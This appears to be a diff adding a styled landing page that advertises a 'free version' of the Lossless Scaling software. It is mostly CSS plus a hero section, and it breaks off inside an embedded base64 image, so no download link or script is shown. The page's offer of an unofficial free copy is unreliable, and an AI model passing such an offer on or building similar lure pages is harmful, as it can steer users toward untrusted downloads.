@@ -1,0 +1,1309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lossless Scaling — Free Version</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --cyan: #00f5ff;
+    --gold: #ffd700;
+    --orange: #ff6b00;
+    --bg: #02050a;
+    --surface: #080d18;
+    --border: rgba(0, 245, 255, 0.15);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: #e0f0ff;
+    font-family: 'Rajdhani', sans-serif;
+    overflow-x: hidden;
+    cursor: none;
+  }
+
+  .cursor {
+    position: fixed;
+    width: 12px; height: 12px;
+    background: var(--cyan);
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 9999;
+    transform: translate(-50%, -50%);
+    transition: transform 0.1s ease, width 0.2s, height 0.2s, background 0.2s;
+    box-shadow: 0 0 20px var(--cyan), 0 0 40px rgba(0,245,255,0.4);
+  }
+  .cursor-ring {
+    position: fixed;
+    width: 36px; height: 36px;
+    border: 1.5px solid rgba(0,245,255,0.5);
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 9998;
+    transform: translate(-50%, -50%);
+    transition: transform 0.15s ease, width 0.3s, height 0.3s;
+  }
+  body:has(.btn:hover) .cursor { background: var(--gold); box-shadow: 0 0 20px var(--gold); width: 18px; height: 18px; }
+
+  
+  #stars-canvas {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
+    background-size: 60px 60px;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 3px,
+      rgba(0,0,0,0.08) 3px,
+      rgba(0,0,0,0.08) 4px
+    );
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    padding: 18px 60px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: linear-gradient(180deg, rgba(2,5,10,0.95) 0%, transparent 100%);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid rgba(0,245,255,0.08);
+  }
+
+  .nav-logo {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 1rem;
+    font-weight: 700;
+    letter-spacing: 0.2em;
+    color: var(--cyan);
+    text-transform: uppercase;
+    text-shadow: 0 0 20px var(--cyan);
+  }
+
+  .nav-links {
+    display: flex;
+    gap: 40px;
+    list-style: none;
+  }
+
+  .nav-links a {
+    color: rgba(224, 240, 255, 0.6);
+    text-decoration: none;
+    font-size: 0.9rem;
+    font-weight: 500;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    transition: color 0.3s, text-shadow 0.3s;
+  }
+
+  .nav-links a:hover {
+    color: var(--cyan);
+    text-shadow: 0 0 15px var(--cyan);
+  }
+
+  
+  .hero {
+    position: relative;
+    z-index: 1;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 120px 40px 60px;
+    overflow: hidden;
+  }
+
+  
+  .orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    pointer-events: none;
+    animation: orb-float 8s ease-in-out infinite;
+  }
+
+  .orb-1 {
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, rgba(0,245,255,0.12) 0%, transparent 70%);
+    top: -100px; left: -100px;
+    animation-delay: 0s;
+  }
+  .orb-2 {
+    width: 500px; height: 500px;
+    background: radial-gradient(circle, rgba(255,107,0,0.1) 0%, transparent 70%);
+    bottom: -50px; right: -100px;
+    animation-delay: -3s;
+  }
+  .orb-3 {
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(255,215,0,0.07) 0%, transparent 70%);
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    animation-delay: -6s;
+  }
+
+  @keyframes orb-float {
+    0%, 100% { transform: translateY(0) scale(1); }
+    33% { transform: translateY(-30px) scale(1.05); }
+    66% { transform: translateY(20px) scale(0.97); }
+  }
+
+  
+  .duck-container {
+    position: relative;
+    margin-bottom: 40px;
+    animation: duck-entrance 1.2s cubic-bezier(0.34,1.56,0.64,1) both;
+  }
+
+  @keyframes duck-entrance {
+    0% { opacity: 0; transform: scale(0.3) rotate(-20deg) translateY(50px); }
+    100% { opacity: 1; transform: scale(1) rotate(0deg) translateY(0); }
+  }
+
+  .duck-glow-ring {
+    position: absolute;
+    inset: -20px;
+    border-radius: 50%;
+    border: 2px solid rgba(0,245,255,0.3);
+    animation: ring-pulse 3s ease-in-out infinite;
+  }
+
+  .duck-glow-ring-2 {
+    position: absolute;
+    inset: -40px;
+    border-radius: 50%;
+    border: 1px solid rgba(0,245,255,0.15);
+    animation: ring-pulse 3s ease-in-out infinite 0.5s;
+  }
+
+  .duck-glow-ring-3 {
+    position: absolute;
+    inset: -60px;
+    border-radius: 50%;
+    border: 1px solid rgba(0,245,255,0.07);
+    animation: ring-pulse 3s ease-in-out infinite 1s;
+  }
+
+  @keyframes ring-pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.5; transform: scale(1.05); }
+  }
+
+  .duck-img {
+    width: 140px;
+    height: 140px;
+    border-radius: 50%;
+    position: relative;
+    z-index: 1;
+    filter: drop-shadow(0 0 30px rgba(0,245,255,0.6)) drop-shadow(0 0 60px rgba(0,245,255,0.3));
+    animation: duck-hover 4s ease-in-out infinite 1.2s;
+  }
+
+  @keyframes duck-hover {
+    0%, 100% { transform: translateY(0) rotate(0deg); filter: drop-shadow(0 0 30px rgba(0,245,255,0.6)) drop-shadow(0 0 60px rgba(0,245,255,0.3)); }
+    25% { transform: translateY(-8px) rotate(2deg); filter: drop-shadow(0 0 40px rgba(0,245,255,0.8)) drop-shadow(0 0 80px rgba(0,245,255,0.4)); }
+    75% { transform: translateY(4px) rotate(-1deg); filter: drop-shadow(0 0 25px rgba(255,215,0,0.6)) drop-shadow(0 0 50px rgba(255,215,0,0.3)); }
+  }
+
+  
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 16px;
+    border: 1px solid rgba(0,245,255,0.3);
+    border-radius: 2px;
+    font-size: 0.75rem;
+    font-family: 'Orbitron', sans-serif;
+    letter-spacing: 0.2em;
+    color: var(--cyan);
+    text-transform: uppercase;
+    margin-bottom: 30px;
+    background: rgba(0,245,255,0.05);
+    animation: fade-in-up 0.8s 0.3s both;
+  }
+
+  .badge-dot {
+    width: 6px; height: 6px;
+    background: #00ff88;
+    border-radius: 50%;
+    box-shadow: 0 0 8px #00ff88;
+    animation: blink 2s infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  
+  .hero-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: clamp(2.8rem, 7vw, 6rem);
+    font-weight: 900;
+    line-height: 1;
+    letter-spacing: -0.01em;
+    margin-bottom: 10px;
+    animation: fade-in-up 0.8s 0.5s both;
+  }
+
+  .title-line-1 {
+    display: block;
+    background: linear-gradient(135deg, #ffffff 0%, rgba(255,255,255,0.8) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    text-shadow: none;
+  }
+
+  .title-line-2 {
+    display: block;
+    background: linear-gradient(135deg, var(--cyan) 0%, #00a8ff 50%, var(--gold) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    filter: drop-shadow(0 0 30px rgba(0,245,255,0.5));
+  }
+
+  .hero-subtitle {
+    font-family: 'Inter', sans-serif;
+    font-size: 1.1rem;
+    font-weight: 300;
+    color: rgba(224,240,255,0.55);
+    max-width: 560px;
+    line-height: 1.7;
+    margin-bottom: 50px;
+    letter-spacing: 0.02em;
+    animation: fade-in-up 0.8s 0.7s both;
+  }
+
+  
+  .cta-group {
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+    justify-content: center;
+    animation: fade-in-up 0.8s 0.9s both;
+  }
+
+  .btn {
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    gap: 12px;
+    padding: 16px 36px;
+    font-family: 'Orbitron', sans-serif;
+    font-size: 0.85rem;
+    font-weight: 700;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    text-decoration: none;
+    border: none;
+    cursor: none;
+    overflow: hidden;
+    transition: transform 0.2s, box-shadow 0.2s;
+  }
+
+  .btn::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+
+  .btn:hover { transform: translateY(-3px); }
+  .btn:hover::before { opacity: 1; }
+  .btn:active { transform: translateY(0); }
+
+  .btn-primary {
+    background: linear-gradient(135deg, var(--cyan) 0%, #0088cc 100%);
+    color: #000;
+    clip-path: polygon(12px 0%, 100% 0%, calc(100% - 12px) 100%, 0% 100%);
+    box-shadow: 0 0 30px rgba(0,245,255,0.4), 0 0 60px rgba(0,245,255,0.2), inset 0 1px 0 rgba(255,255,255,0.3);
+  }
+
+  .btn-primary::before {
+    background: linear-gradient(135deg, #fff 0%, var(--cyan) 100%);
+  }
+
+  .btn-primary:hover {
+    box-shadow: 0 0 50px rgba(0,245,255,0.7), 0 0 100px rgba(0,245,255,0.4), inset 0 1px 0 rgba(255,255,255,0.3);
+  }
+
+  .btn-secondary {
+    background: transparent;
+    color: var(--cyan);
+    border: 1px solid rgba(0,245,255,0.4);
+    clip-path: polygon(12px 0%, 100% 0%, calc(100% - 12px) 100%, 0% 100%);
+    box-shadow: inset 0 0 20px rgba(0,245,255,0.05);
+  }
+
+  .btn-secondary:hover {
+    background: rgba(0,245,255,0.08);
+    border-color: var(--cyan);
+    box-shadow: 0 0 20px rgba(0,245,255,0.3), inset 0 0 20px rgba(0,245,255,0.08);
+    color: #fff;
+  }
+
+  .btn-icon {
+    font-size: 1.1rem;
+    line-height: 1;
+  }
+
+  
+  @keyframes ripple {
+    0% { transform: scale(0); opacity: 1; }
+    100% { transform: scale(4); opacity: 0; }
+  }
+
+  .btn-primary .ripple-el {
+    position: absolute;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.4);
+    width: 60px; height: 60px;
+    margin-top: -30px; margin-left: -30px;
+    animation: ripple 0.6s linear;
+    pointer-events: none;
+  }
+
+  
+  .version-info {
+    margin-top: 30px;
+    display: flex;
+    gap: 30px;
+    justify-content: center;
+    animation: fade-in-up 0.8s 1.1s both;
+  }
+
+  .version-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+  }
+
+  .version-label {
+    font-size: 0.7rem;
+    color: rgba(255,255,255,0.3);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    font-family: 'Orbitron', sans-serif;
+  }
+
+  .version-value {
+    font-size: 0.9rem;
+    color: rgba(255,255,255,0.7);
+    font-weight: 500;
+  }
+
+  .version-divider {
+    width: 1px;
+    background: rgba(0,245,255,0.2);
+    align-self: stretch;
+  }
+
+  
+  .scroll-indicator {
+    position: absolute;
+    bottom: 40px;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+    animation: fade-in-up 0.8s 1.5s both;
+  }
+
+  .scroll-line {
+    width: 1px;
+    height: 50px;
+    background: linear-gradient(180deg, var(--cyan) 0%, transparent 100%);
+    animation: scroll-pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes scroll-pulse {
+    0%, 100% { opacity: 0.3; transform: scaleY(1); }
+    50% { opacity: 1; transform: scaleY(1.2); }
+  }
+
+  .scroll-text {
+    font-size: 0.65rem;
+    color: rgba(0,245,255,0.4);
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    font-family: 'Orbitron', sans-serif;
+  }
+
+  
+  .stats-band {
+    position: relative;
+    z-index: 1;
+    background: linear-gradient(90deg, transparent, rgba(0,245,255,0.04), rgba(0,245,255,0.04), transparent);
+    border-top: 1px solid rgba(0,245,255,0.1);
+    border-bottom: 1px solid rgba(0,245,255,0.1);
+    padding: 30px 0;
+    overflow: hidden;
+  }
+
+  .stats-band::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+    animation: line-scan 4s linear infinite;
+  }
+
+  @keyframes line-scan {
+    0% { left: -60%; }
+    100% { left: 160%; }
+  }
+
+  .stats-inner {
+    display: flex;
+    justify-content: center;
+    gap: 80px;
+    flex-wrap: wrap;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 40px;
+  }
+
+  .stat {
+    text-align: center;
+    opacity: 0;
+    animation: fade-in-up 0.6s forwards;
+  }
+
+  .stat:nth-child(1) { animation-delay: 0.1s; }
+  .stat:nth-child(2) { animation-delay: 0.2s; }
+  .stat:nth-child(3) { animation-delay: 0.3s; }
+  .stat:nth-child(4) { animation-delay: 0.4s; }
+
+  .stat-number {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 2.2rem;
+    font-weight: 900;
+    background: linear-gradient(135deg, var(--cyan), var(--gold));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    display: block;
+    counter-reset: none;
+  }
+
+  .stat-label {
+    font-size: 0.75rem;
+    color: rgba(255,255,255,0.35);
+    text-transform: uppercase;
+    letter-spacing: 0.2em;
+    margin-top: 4px;
+  }
+
+  
+  .features {
+    position: relative;
+    z-index: 1;
+    padding: 120px 40px;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .section-header {
+    text-align: center;
+    margin-bottom: 80px;
+  }
+
+  .section-tag {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 0.7rem;
+    color: var(--cyan);
+    letter-spacing: 0.35em;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+    opacity: 0.7;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: clamp(1.8rem, 4vw, 2.8rem);
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: -0.02em;
+  }
+
+  .section-title span {
+    color: var(--cyan);
+  }
+
+  .features-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+    gap: 2px;
+  }
+
+  .feature-card {
+    position: relative;
+    background: rgba(8,13,24,0.8);
+    border: 1px solid rgba(0,245,255,0.08);
+    padding: 40px;
+    overflow: hidden;
+    transition: border-color 0.4s, transform 0.4s;
+    opacity: 0;
+    animation: fade-in-up 0.7s forwards;
+  }
+
+  .feature-card:nth-child(1) { animation-delay: 0.1s; }
+  .feature-card:nth-child(2) { animation-delay: 0.2s; }
+  .feature-card:nth-child(3) { animation-delay: 0.3s; }
+  .feature-card:nth-child(4) { animation-delay: 0.4s; }
+  .feature-card:nth-child(5) { animation-delay: 0.5s; }
+  .feature-card:nth-child(6) { animation-delay: 0.6s; }
+
+  .feature-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: linear-gradient(135deg, rgba(0,245,255,0.05) 0%, transparent 60%);
+    opacity: 0;
+    transition: opacity 0.4s;
+  }
+
+  .feature-card::after {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 0;
+    background: linear-gradient(180deg, var(--cyan), var(--gold));
+    transition: height 0.4s;
+  }
+
+  .feature-card:hover {
+    border-color: rgba(0,245,255,0.3);
+    transform: translateY(-4px);
+  }
+
+  .feature-card:hover::before { opacity: 1; }
+  .feature-card:hover::after { height: 100%; }
+
+  .feature-icon {
+    width: 56px; height: 56px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 1px solid rgba(0,245,255,0.2);
+    margin-bottom: 24px;
+    font-size: 1.5rem;
+    position: relative;
+    background: rgba(0,245,255,0.03);
+    clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
+  }
+
+  .feature-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 0.95rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 12px;
+    letter-spacing: 0.05em;
+  }
+
+  .feature-desc {
+    font-family: 'Inter', sans-serif;
+    font-size: 0.9rem;
+    color: rgba(255,255,255,0.45);
+    line-height: 1.7;
+    font-weight: 300;
+  }
+
+  
+  .tech-bar {
+    position: relative;
+    z-index: 1;
+    background: var(--surface);
+    border-top: 1px solid rgba(0,245,255,0.08);
+    border-bottom: 1px solid rgba(0,245,255,0.08);
+    padding: 60px 40px;
+    overflow: hidden;
+  }
+
+  .tech-bar-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    gap: 60px;
+    flex-wrap: wrap;
+  }
+
+  .tech-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 0.8rem;
+    color: rgba(255,255,255,0.3);
+    text-transform: uppercase;
+    letter-spacing: 0.3em;
+    flex-shrink: 0;
+  }
+
+  .tech-tags {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+    flex: 1;
+  }
+
+  .tech-tag {
+    padding: 6px 14px;
+    border: 1px solid rgba(0,245,255,0.15);
+    font-size: 0.8rem;
+    color: rgba(0,245,255,0.7);
+    font-family: 'Orbitron', sans-serif;
+    letter-spacing: 0.1em;
+    background: rgba(0,245,255,0.03);
+    clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
+    transition: all 0.3s;
+  }
+
+  .tech-tag:hover {
+    border-color: var(--cyan);
+    color: var(--cyan);
+    background: rgba(0,245,255,0.08);
+    box-shadow: 0 0 15px rgba(0,245,255,0.2);
+  }
+
+  
+  .big-cta {
+    position: relative;
+    z-index: 1;
+    padding: 160px 40px;
+    text-align: center;
+    overflow: hidden;
+  }
+
+  .big-cta-bg {
+    position: absolute;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 80% 60% at 50% 50%, rgba(0,245,255,0.08) 0%, transparent 70%);
+  }
+
+  .big-cta-title {
+    font-family: 'Orbitron', sans-serif;
+    font-size: clamp(2rem, 5vw, 4rem);
+    font-weight: 900;
+    color: #fff;
+    margin-bottom: 20px;
+    letter-spacing: -0.02em;
+  }
+
+  .big-cta-title span {
+    background: linear-gradient(135deg, var(--cyan), var(--gold));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .big-cta-sub {
+    font-family: 'Inter', sans-serif;
+    font-size: 1rem;
+    color: rgba(255,255,255,0.35);
+    margin-bottom: 60px;
+    font-weight: 300;
+    letter-spacing: 0.05em;
+  }
+
+  .download-btn-big {
+    position: relative;
+    display: inline-flex;
+    align-items: center;
+    gap: 16px;
+    padding: 22px 60px;
+    background: linear-gradient(135deg, var(--cyan) 0%, #00a0d0 50%, var(--gold) 100%);
+    background-size: 200% 200%;
+    color: #000;
+    font-family: 'Orbitron', sans-serif;
+    font-size: 1rem;
+    font-weight: 900;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    text-decoration: none;
+    clip-path: polygon(20px 0%, 100% 0%, calc(100% - 20px) 100%, 0% 100%);
+    box-shadow:
+      0 0 40px rgba(0,245,255,0.5),
+      0 0 80px rgba(0,245,255,0.25),
+      0 20px 60px rgba(0,0,0,0.5);
+    animation: gradient-shift 4s ease infinite, btn-glow-pulse 3s ease infinite;
+    transition: transform 0.2s, box-shadow 0.2s;
+    cursor: none;
+    border: none;
+  }
+
+  @keyframes gradient-shift {
+    0%, 100% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+  }
+
+  @keyframes btn-glow-pulse {
+    0%, 100% { box-shadow: 0 0 40px rgba(0,245,255,0.5), 0 0 80px rgba(0,245,255,0.25), 0 20px 60px rgba(0,0,0,0.5); }
+    50% { box-shadow: 0 0 60px rgba(0,245,255,0.8), 0 0 120px rgba(0,245,255,0.4), 0 20px 60px rgba(0,0,0,0.5); }
+  }
+
+  .download-btn-big:hover {
+    transform: translateY(-6px) scale(1.02);
+  }
+
+  .download-icon {
+    font-size: 1.3rem;
+    animation: bounce-icon 2s ease-in-out infinite;
+  }
+
+  @keyframes bounce-icon {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(4px); }
+  }
+
+  .download-size {
+    font-size: 0.65rem;
+    color: rgba(0,0,0,0.5);
+    letter-spacing: 0.2em;
+    margin-top: 20px;
+    text-align: center;
+    font-family: 'Inter', sans-serif;
+  }
+
+  
+  .particle {
+    position: fixed;
+    pointer-events: none;
+    border-radius: 50%;
+    z-index: 0;
+  }
+
+  
+  footer {
+    position: relative;
+    z-index: 1;
+    border-top: 1px solid rgba(0,245,255,0.08);
+    padding: 40px;
+    text-align: center;
+  }
+
+  .footer-logo {
+    font-family: 'Orbitron', sans-serif;
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: rgba(0,245,255,0.4);
+    margin-bottom: 16px;
+    letter-spacing: 0.2em;
+  }
+
+  .footer-text {
+    font-size: 0.8rem;
+    color: rgba(255,255,255,0.2);
+    font-family: 'Inter', sans-serif;
+  }
+
+  
+  @keyframes fade-in-up {
+    0% { opacity: 0; transform: translateY(24px); }
+    100% { opacity: 1; transform: translateY(0); }
+  }
+
+  
+  .noise {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    pointer-events: none;
+    opacity: 0.03;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+    background-size: 200px 200px;
+  }
+
+  
+  .hex-deco {
+    position: absolute;
+    opacity: 0.04;
+    pointer-events: none;
+    font-size: 20rem;
+    font-family: 'Orbitron', sans-serif;
+    color: var(--cyan);
+    font-weight: 900;
+    line-height: 1;
+    z-index: 0;
+    user-select: none;
+  }
+</style>
+</head>
+<body>
+
+<div class="noise"></div>
+<canvas id="stars-canvas"></canvas>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursor-ring"></div>
+
+<nav>
+  <div class="nav-logo">⬡ Lossless Scaling</div>
+</nav>
+<section class="hero">
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="orb orb-3"></div>
+
+  <div class="hex-deco" style="top:-60px;right:-80px;font-size:22rem;">⬡</div>
+  <div class="hex-deco" style="bottom:80px;left:-100px;font-size:18rem;">⬡</div>
+
+  <div class="badge">
+    <span class="badge-dot"></span>
+    Free Version Available
+  </div>
+
+  <div class="duck-container">
+    <div class="duck-glow-ring"></div>
+    <div class="duck-glow-ring-2"></div>
+    <div class="duck-glow-ring-3"></div>
+    <img class="duck-img" src="data:image/png;base64,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